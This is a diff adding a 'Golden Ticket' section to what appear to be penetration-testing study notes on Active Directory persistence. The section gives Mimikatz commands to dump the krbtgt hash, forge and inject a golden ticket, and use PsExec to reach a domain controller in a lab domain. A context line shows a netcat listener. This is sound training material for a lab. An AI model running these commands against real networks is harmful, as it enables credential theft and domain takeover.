@@ -571,7 +571,39 @@ nc -lnvp 443
 ```
 ---
 # Persistence
-
+## Golden Ticket
+Returning to the explanation of Kerberos authentication, we'll recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt.1 If we are able to get our hands on the krbtgt password hash, we could create our own self-made custom TGTs, also known as golden tickets.
+- To test this persistence technique, we will first attempt to laterally move from the Windows 11 CLIENT74 workstation to the domain controller via PsExec as the jen user by spawning a traditional command shell with the cmd command. This should fail because we do not have the proper permissions.
+```
+PsExec64.exe \\DC1 cmd.exe
+```
+- At this stage of the engagement, the golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself in order to work as a persistence method. With this kind of access, we can extract the password hash of the krbtgt account with Mimikatz. To simulate this, we'll log in to the domain controller via remote desktop using the jeffadmin account, run Mimikatz from C:\Tools, and issue the lsadump::lsa command as displayed below:
+```
+privilege::debug
+```
+```
+lsadump::lsa /patch
+```
+**Having obtained the NTLM hash of the krbtgt account, along with the domain SID, we can now forge and inject our golden ticket.**
+- Creating the golden ticket and injecting it into memory does not require any administrative privileges and can even be performed from a computer that is not joined to the domain. We'll take the hash and continue the procedure from a compromised workstation. Back on CLIENT74 as the jen user, before generating the golden ticket, we'll launch mimikatz and delete any existing Kerberos tickets with kerberos::purge. We'll supply the domain SID (which we can gather with whoami /user) to the Mimikatz kerberos::golden5 command to create the golden ticket. This time, we'll use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash of the krbtgt user account. Starting July 2022,6 we'll need to provide an existing account, so let's set the golden ticket's username to jen.
+```
+kerberos::purge
+```
+```
+kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+```
+```
+misc::cmd
+```
+Mimikatz provides two sets of default values when using the golden ticket option: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, while the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group. With the golden ticket injected into memory, we've launched a new command prompt with misc::cmd from which we again attempt lateral movement with PsExec.
+```
+PsExec.exe \\dc1 cmd.exe
+```
+**Note that by creating our own TGT and then using PsExec, we are performing the overpass the hash attack by leveraging Kerberos authentication as we discussed earlier in this Module. If we were to connect PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked as the next listing shows.**
+```
+psexec.exe \\192.168.50.70 cmd.exe
+```
+## Shadow Copies
 
 
 
